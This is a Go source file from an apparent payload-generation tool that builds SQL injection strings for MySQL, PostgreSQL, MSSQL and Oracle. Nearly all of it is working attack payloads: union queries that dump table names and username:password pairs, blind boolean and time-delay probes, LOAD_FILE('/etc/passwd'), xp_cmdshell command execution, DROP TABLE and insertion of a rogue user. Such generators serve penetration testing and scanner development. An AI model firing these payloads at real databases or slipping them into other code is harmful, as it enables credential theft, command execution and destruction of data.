// Package generators implements payload generators for various attack types
package generators

import (
	"context"
	"crypto/rand"
	"fmt"
	"time"

	"github.com/yourusername/payload-forge/internal/core"
)

// SQLInjectionGenerator generates SQL injection payloads
type SQLInjectionGenerator struct {
	name string
}

// NewSQLInjectionGenerator creates a new SQL injection generator
func NewSQLInjectionGenerator() *SQLInjectionGenerator {
	return &SQLInjectionGenerator{
		name: "sql_injection",
	}
}

// Name returns the generator name
func (g *SQLInjectionGenerator) Name() string {
	return g.name
}

// Type returns the payload type
func (g *SQLInjectionGenerator) Type() core.PayloadType {
	return core.PayloadTypeSQLi
}

// Category returns the OWASP category
func (g *SQLInjectionGenerator) Category() core.Category {
	return core.CategoryInjection
}

// Generate creates SQL injection payloads based on configuration
func (g *SQLInjectionGenerator) Generate(ctx context.Context, config core.GeneratorConfig) ([]core.Payload, error) {
	var payloads []core.Payload

	// Extract custom config
	databases := g.extractDatabases(config)
	techniques := g.extractTechniques(config)
	complexity := config.Complexity
	if complexity == 0 {
		complexity = 5 // Default medium complexity
	}

	// Generate payloads for each database type and technique
	for _, db := range databases {
		for _, technique := range techniques {
			switch technique {
			case "union":
				payloads = append(payloads, g.generateUnionBased(db, complexity)...)
			case "boolean":
				payloads = append(payloads, g.generateBooleanBased(db, complexity)...)
			case "time":
				payloads = append(payloads, g.generateTimeBased(db, complexity)...)
			case "error":
				payloads = append(payloads, g.generateErrorBased(db, complexity)...)
			case "stacked":
				payloads = append(payloads, g.generateStackedQueries(db, complexity)...)
			}

			// Check context cancellation
			select {
			case <-ctx.Done():
				return payloads, ctx.Err()
			default:
			}
		}
	}

	// Apply max count limit
	if config.MaxCount > 0 && len(payloads) > config.MaxCount {
		payloads = payloads[:config.MaxCount]
	}

	return payloads, nil
}

// Validate checks if a payload is valid
func (g *SQLInjectionGenerator) Validate(payload core.Payload) error {
	if payload.Type != core.PayloadTypeSQLi {
		return fmt.Errorf("invalid payload type: expected %s, got %s", core.PayloadTypeSQLi, payload.Type)
	}
	if len(payload.Content) == 0 {
		return fmt.Errorf("payload content is empty")
	}
	return nil
}

// ============================================================================
// UNION-BASED SQL INJECTION
// ============================================================================

func (g *SQLInjectionGenerator) generateUnionBased(db string, complexity int) []core.Payload {
	var payloads []core.Payload

	// Basic UNION payloads
	basePayloads := []string{
		"' UNION SELECT NULL--",
		"' UNION SELECT NULL,NULL--",
		"' UNION SELECT NULL,NULL,NULL--",
		"' UNION ALL SELECT NULL--",
		"' UNION ALL SELECT NULL,NULL--",
		"' UNION ALL SELECT NULL,NULL,NULL--",
	}

	for _, base := range basePayloads {
		payloads = append(payloads, g.createPayload(base, db, "union", core.SeverityHigh))
	}

	// Database-specific information extraction
	switch db {
	case "mysql":
		payloads = append(payloads,
			g.createPayload("' UNION SELECT user(),database(),version()--", db, "union", core.SeverityHigh),
			g.createPayload("' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--", db, "union", core.SeverityCritical),
			g.createPayload("' UNION SELECT column_name,table_name,NULL FROM information_schema.columns--", db, "union", core.SeverityCritical),
			g.createPayload("' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--", db, "union", core.SeverityCritical),
		)

	case "postgresql":
		payloads = append(payloads,
			g.createPayload("' UNION SELECT current_user,current_database(),version()--", db, "union", core.SeverityHigh),
			g.createPayload("' UNION SELECT tablename,NULL,NULL FROM pg_tables--", db, "union", core.SeverityCritical),
			g.createPayload("' UNION SELECT column_name,table_name,NULL FROM information_schema.columns--", db, "union", core.SeverityCritical),
		)

	case "mssql":
		payloads = append(payloads,
			g.createPayload("' UNION SELECT SYSTEM_USER,DB_NAME(),@@VERSION--", db, "union", core.SeverityHigh),
			g.createPayload("' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U'--", db, "union", core.SeverityCritical),
			g.createPayload("' UNION SELECT name,NULL,NULL FROM syscolumns--", db, "union", core.SeverityCritical),
		)

	case "oracle":
		payloads = append(payloads,
			g.createPayload("' UNION SELECT user,NULL,NULL FROM dual--", db, "union", core.SeverityHigh),
			g.createPayload("' UNION SELECT table_name,NULL,NULL FROM all_tables--", db, "union", core.SeverityCritical),
			g.createPayload("' UNION SELECT column_name,table_name,NULL FROM all_tab_columns--", db, "union", core.SeverityCritical),
		)
	}

	// Complex payloads (if complexity >= 7)
	if complexity >= 7 {
		payloads = append(payloads,
			g.createPayload("' UNION SELECT NULL,NULL,NULL WHERE 1=2 UNION SELECT table_name,column_name,data_type FROM information_schema.columns--", db, "union", core.SeverityCritical),
			g.createPayload("' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--", db, "union", core.SeverityCritical),
		)
	}

	return payloads
}

// ============================================================================
// BOOLEAN-BASED BLIND SQL INJECTION
// ============================================================================

func (g *SQLInjectionGenerator) generateBooleanBased(db string, complexity int) []core.Payload {
	var payloads []core.Payload

	// Basic boolean tests
	basePayloads := []string{
		"' AND '1'='1",
		"' AND '1'='2",
		"' OR '1'='1",
		"' OR '1'='2",
		"' AND 1=1--",
		"' AND 1=2--",
		"' OR 1=1--",
		"' OR 1=2--",
		"admin' AND '1'='1",
		"admin' AND '1'='2",
	}

	for _, base := range basePayloads {
		payloads = append(payloads, g.createPayload(base, db, "boolean", core.SeverityHigh))
	}

	// Substring extraction (bit-by-bit data exfiltration)
	if complexity >= 5 {
		payloads = append(payloads,
			g.createPayload("' AND SUBSTRING(user(),1,1)='a'--", db, "boolean", core.SeverityHigh),
			g.createPayload("' AND ASCII(SUBSTRING(user(),1,1))>100--", db, "boolean", core.SeverityHigh),
			g.createPayload("' AND LENGTH(database())>5--", db, "boolean", core.SeverityHigh),
		)
	}

	// Advanced boolean-based
	if complexity >= 8 {
		payloads = append(payloads,
			g.createPayload("' AND (SELECT COUNT(*) FROM users)>0--", db, "boolean", core.SeverityCritical),
			g.createPayload("' AND (SELECT LENGTH(password) FROM users LIMIT 1)>10--", db, "boolean", core.SeverityCritical),
		)
	}

	return payloads
}

// ============================================================================
// TIME-BASED BLIND SQL INJECTION
// ============================================================================

func (g *SQLInjectionGenerator) generateTimeBased(db string, complexity int) []core.Payload {
	var payloads []core.Payload

	switch db {
	case "mysql":
		payloads = append(payloads,
			g.createPayload("' AND SLEEP(5)--", db, "time", core.SeverityHigh),
			g.createPayload("' OR SLEEP(5)--", db, "time", core.SeverityHigh),
			g.createPayload("' AND BENCHMARK(5000000,MD5('test'))--", db, "time", core.SeverityHigh),
			g.createPayload("' AND IF(1=1,SLEEP(5),0)--", db, "time", core.SeverityHigh),
		)

		if complexity >= 7 {
			payloads = append(payloads,
				g.createPayload("' AND IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0)--", db, "time", core.SeverityCritical),
				g.createPayload("' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--", db, "time", core.SeverityCritical),
			)
		}

	case "postgresql":
		payloads = append(payloads,
			g.createPayload("'; SELECT pg_sleep(5)--", db, "time", core.SeverityHigh),
			g.createPayload("' AND pg_sleep(5)--", db, "time", core.SeverityHigh),
		)

	case "mssql":
		payloads = append(payloads,
			g.createPayload("'; WAITFOR DELAY '00:00:05'--", db, "time", core.SeverityHigh),
			g.createPayload("' WAITFOR DELAY '00:00:05'--", db, "time", core.SeverityHigh),
			g.createPayload("' IF (1=1) WAITFOR DELAY '00:00:05'--", db, "time", core.SeverityHigh),
		)

	case "oracle":
		payloads = append(payloads,
			g.createPayload("' AND DBMS_LOCK.SLEEP(5)--", db, "time", core.SeverityHigh),
		)
	}

	return payloads
}

// ============================================================================
// ERROR-BASED SQL INJECTION
// ============================================================================

func (g *SQLInjectionGenerator) generateErrorBased(db string, complexity int) []core.Payload {
	var payloads []core.Payload

	// Generic error-based
	basePayloads := []string{
		"'",
		"''",
		"\"",
		"\"\"",
		"`",
		"``",
		"';",
		"\";",
		"')",
		"\")",
	}

	for _, base := range basePayloads {
		payloads = append(payloads, g.createPayload(base, db, "error", core.SeverityMedium))
	}

	// Database-specific error extraction
	switch db {
	case "mysql":
		payloads = append(payloads,
			g.createPayload("' AND extractvalue(1,concat(0x7e,version()))--", db, "error", core.SeverityHigh),
			g.createPayload("' AND updatexml(1,concat(0x7e,user()),1)--", db, "error", core.SeverityHigh),
			g.createPayload("' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--", db, "error", core.SeverityCritical),
		)

	case "postgresql":
		payloads = append(payloads,
			g.createPayload("' AND CAST(version() AS int)--", db, "error", core.SeverityHigh),
			g.createPayload("' AND 1::int=version()--", db, "error", core.SeverityHigh),
		)

	case "mssql":
		payloads = append(payloads,
			g.createPayload("' AND 1=CONVERT(int,@@version)--", db, "error", core.SeverityHigh),
			g.createPayload("' AND 1=CAST(@@version AS int)--", db, "error", core.SeverityHigh),
		)

	case "oracle":
		payloads = append(payloads,
			g.createPayload("' AND TO_CHAR(DBMS_UTILITY.SQLID_TO_ADDRESS('a'))--", db, "error", core.SeverityHigh),
			g.createPayload("' AND UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--", db, "error", core.SeverityCritical),
		)
	}

	return payloads
}

// ============================================================================
// STACKED QUERIES
// ============================================================================

func (g *SQLInjectionGenerator) generateStackedQueries(db string, complexity int) []core.Payload {
	var payloads []core.Payload

	switch db {
	case "mysql":
		payloads = append(payloads,
			g.createPayload("'; SELECT SLEEP(5)--", db, "stacked", core.SeverityHigh),
			g.createPayload("'; DROP TABLE test--", db, "stacked", core.SeverityCritical),
		)

	case "postgresql":
		payloads = append(payloads,
			g.createPayload("'; SELECT pg_sleep(5)--", db, "stacked", core.SeverityHigh),
			g.createPayload("'; CREATE TABLE test(id int)--", db, "stacked", core.SeverityCritical),
		)

	case "mssql":
		payloads = append(payloads,
			g.createPayload("'; WAITFOR DELAY '00:00:05'--", db, "stacked", core.SeverityHigh),
			g.createPayload("'; EXEC sp_configure 'show advanced options',1--", db, "stacked", core.SeverityCritical),
			g.createPayload("'; EXEC xp_cmdshell 'whoami'--", db, "stacked", core.SeverityCritical),
		)
	}

	if complexity >= 9 {
		payloads = append(payloads,
			g.createPayload("'; INSERT INTO users(username,password) VALUES('hacker','pwned')--", db, "stacked", core.SeverityCritical),
		)
	}

	return payloads
}

// ============================================================================
// HELPERS
// ============================================================================

func (g *SQLInjectionGenerator) createPayload(content, database, technique string, severity core.Severity) core.Payload {
	id := generateID()

	return core.Payload{
		ID:       id,
		Type:     core.PayloadTypeSQLi,
		Content:  []byte(content),
		Severity: severity,
		Tags:     []string{database, technique, "sqli"},
		Metadata: map[string]interface{}{
			"database":  database,
			"technique": technique,
			"length":    len(content),
		},
		Created:   time.Now(),
		Generator: g.name,
	}
}

func (g *SQLInjectionGenerator) extractDatabases(config core.GeneratorConfig) []string {
	if val, ok := config.Custom["databases"]; ok {
		if databases, ok := val.([]string); ok {
			return databases
		}
		if databases, ok := val.([]interface{}); ok {
			result := make([]string, 0, len(databases))
			for _, db := range databases {
				if dbStr, ok := db.(string); ok {
					result = append(result, dbStr)
				}
			}
			return result
		}
	}
	// Default databases
	return []string{"mysql", "postgresql", "mssql", "oracle"}
}

func (g *SQLInjectionGenerator) extractTechniques(config core.GeneratorConfig) []string {
	if val, ok := config.Custom["techniques"]; ok {
		if techniques, ok := val.([]string); ok {
			return techniques
		}
		if techniques, ok := val.([]interface{}); ok {
			result := make([]string, 0, len(techniques))
			for _, tech := range techniques {
				if techStr, ok := tech.(string); ok {
					result = append(result, techStr)
				}
			}
			return result
		}
	}
	// Default techniques
	return []string{"union", "boolean", "time", "error"}
}

// generateID creates a unique payload ID
func generateID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return fmt.Sprintf("sqli_%x_%d", b, time.Now().UnixNano())
}
